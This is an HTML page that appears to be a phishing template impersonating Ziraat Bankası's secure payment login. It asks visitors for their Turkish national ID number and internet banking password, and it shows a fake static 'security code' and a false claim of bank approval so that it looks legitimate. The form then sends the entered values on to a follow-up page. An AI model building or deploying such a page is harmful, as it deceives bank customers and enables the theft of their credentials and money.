
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Ziraat Güvenli Ödeme - Giriş</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f4f4f4;
      font-family: "Segoe UI", sans-serif;
    }
    .container {
      max-width: 400px;
      margin: 80px auto;
      padding: 30px;
      background-color: #fff;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      width: 160px;
      margin-bottom: 30px;
    }
    h2 {
      color: #ba0c2f;
      margin-bottom: 20px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      box-sizing: border-box;
    }
    .code-box {
      margin-top: 20px;
      font-size: 22px;
      letter-spacing: 6px;
      color: #000;
      background: #e4e4e4;
      padding: 10px;
      border-radius: 8px;
      font-weight: bold;
      user-select: none;
    }
    .button {
      margin-top: 25px;
      background-color: #ba0c2f;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
    }
    .note {
      margin-top: 25px;
      font-size: 13px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="ziraat.png" alt="Ziraat Bankası Logo" class="logo">
    <h2>Güvenli Ödeme Girişi</h2>
    <form action="odeme_bilgilendirme.html" method="GET">
      <input type="text" name="tc" placeholder="T.C. Kimlik Numaranız" maxlength="11" required pattern="\d{11}">
      <input type="password" name="sifre" placeholder="İnternet Şifreniz" required>
      <div class="code-box">A93F7K</div>
      <input type="text" name="kod" placeholder="Yukarıdaki Güvenlik Kodunu Yazınız" maxlength="6" required>
      <button type="submit" class="button">Devam Et</button>
    </form>
    <div class="note">
      Bu ekran <strong>Ziraat Onaylı Bilgilendirme</strong> amaçlıdır.
    </div>
  </div>
</body>
</html>
